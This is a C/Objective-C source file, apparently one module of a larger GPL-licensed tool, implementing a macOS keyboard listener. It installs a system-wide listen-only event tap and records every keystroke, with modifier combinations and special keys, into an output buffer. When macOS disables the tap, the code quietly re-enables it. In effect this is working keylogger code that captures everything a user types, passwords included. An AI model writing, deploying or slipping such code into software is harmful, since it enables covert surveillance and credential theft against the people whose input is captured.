/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#ifdef __APPLE__
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>

static pthread_t listener_thread;
static int listener_started;
static volatile int stopping;
static CFRunLoopRef run_loop_ref;
static CFMachPortRef global_event_tap;

static const char *get_macos_special_key_label(int64_t keycode)
{
    switch (keycode) {
    case 0x24: return "\n";       /* Return */
    case 0x30: return "\t";       /* Tab */
    case 0x31: return " ";        /* Space */
    case 0x33: return "BS";       /* Backspace */
    case 0x35: return "ESC";      /* Escape */
    case 0x4C: return "\n";       /* Numpad Enter */
    case 0x73: return "Home";
    case 0x74: return "PgUp";
    case 0x75: return "Del";      /* Forward Delete */
    case 0x77: return "End";
    case 0x79: return "PgDn";
    case 0x7B: return "Left";
    case 0x7C: return "Right";
    case 0x7D: return "Down";
    case 0x7E: return "Up";
    case 0x7A: return "F1";
    case 0x78: return "F2";
    case 0x63: return "F3";
    case 0x76: return "F4";
    case 0x60: return "F5";
    case 0x61: return "F6";
    case 0x62: return "F7";
    case 0x64: return "F8";
    case 0x65: return "F9";
    case 0x6D: return "F10";
    case 0x67: return "F11";
    case 0x6F: return "F12";
    default: return nullptr;
    }
}

static CGEventRef event_callback([[maybe_unused]] CGEventTapProxy proxy,
                                 CGEventType type,
                                 CGEventRef event,
                                 [[maybe_unused]] void *refcon)
{
    if (type == kCGEventKeyDown) {
        CGEventFlags flags = CGEventGetFlags(event);
        int cmd_down = (flags & kCGEventFlagMaskCommand) != 0;
        int ctrl_down = (flags & kCGEventFlagMaskControl) != 0;
        int alt_down = (flags & kCGEventFlagMaskAlternate) != 0;
        int shift_down = (flags & kCGEventFlagMaskShift) != 0;

        int64_t keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        const char *special = get_macos_special_key_label(keycode);

        char key_label[64] = {0};
        int is_special = 0;
        int is_printable = 0;

        if (special) {
            if (strcmp(special, "\n") == 0 || strcmp(special, "\t") == 0 || strcmp(special, " ") == 0) {
                key_label[0] = special[0];
                key_label[1] = '\0';
                is_printable = 1;
            } else {
                snprintf(key_label, sizeof(key_label), "%s", special);
                is_special = 1;
            }
        } else {
            UniChar chars[8] = {0};
            UniCharCount actual_length = 0;
            CGEventKeyboardGetUnicodeString(event, 8, &actual_length, chars);

            if (actual_length > 0) {
                NSString *str = [NSString stringWithCharacters:chars length:actual_length];
                const char *utf8 = [str UTF8String];
                if (utf8 && *utf8) {
                    snprintf(key_label, sizeof(key_label), "%s", utf8);
                    is_printable = 1;
                }
            }
        }

        if (is_special || is_printable) {
            int has_modifier = cmd_down || ctrl_down || alt_down;
            if (has_modifier && key_label[0] != '\n') {
                char mod_buf[96];
                int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
                if (cmd_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Cmd+");
                if (ctrl_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
                if (alt_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Option+");
                if (shift_down && !is_printable) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Shift+");
                offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "%s]", key_label);
                if (offset > 0 && (size_t)offset < sizeof(mod_buf)) {
                    keyboard_output_append(mod_buf, (size_t)offset);
                }
            } else if (is_special) {
                char spec_buf[48];
                int spec_len = snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
                if (spec_len > 0) {
                    keyboard_output_append(spec_buf, (size_t)spec_len);
                }
            } else if (is_printable) {
                keyboard_output_append(key_label, strlen(key_label));
            }
        }
    } else if (type == kCGEventTapDisabledByTimeout || type == kCGEventTapDisabledByUserInput) {
        c2t_log_warning("keyboard", "macOS event tap disabled by system, re-enabling");
        if (global_event_tap) {
            CGEventTapEnable(global_event_tap, true);
        }
    }

    return event;
}

static void *listener_worker([[maybe_unused]] void *context)
{
    @autoreleasepool {
        run_loop_ref = CFRunLoopGetCurrent();

        CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef event_tap = CGEventTapCreate(
            kCGSessionEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionListenOnly,
            mask,
            event_callback,
            nullptr
        );

        if (!event_tap) {
            c2t_log_warning("keyboard", "Unable to create macOS CGEventTap (check Accessibility permissions)");
            run_loop_ref = nullptr;
            return nullptr;
        }

        global_event_tap = event_tap;

        CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
        CFRunLoopAddSource(run_loop_ref, run_loop_source, kCFRunLoopCommonModes);
        CGEventTapEnable(event_tap, true);

        c2t_log_info("keyboard", "macOS keyboard event tap active");

        while (!stopping && !c2t_runtime_stop_requested()) {
            SInt32 result = CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.2, true);
            if (result == kCFRunLoopRunStopped || result == kCFRunLoopRunFinished)
                break;
        }

        CGEventTapEnable(event_tap, false);
        CFRunLoopRemoveSource(run_loop_ref, run_loop_source, kCFRunLoopCommonModes);
        CFRelease(run_loop_source);
        CFRelease(event_tap);
        global_event_tap = nullptr;
        run_loop_ref = nullptr;

        keyboard_output_flush();
    }
    return nullptr;
}

int keyboard_listen(void)
{
    listener_worker(nullptr);
    return 0;
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    listener_started = (pthread_create(&listener_thread, nullptr, listener_worker, nullptr) == 0);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start macOS keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    if (run_loop_ref) {
        CFRunLoopStop(run_loop_ref);
    }
    (void)pthread_join(listener_thread, nullptr);
    listener_started = 0;
    run_loop_ref = nullptr;
}
#endif
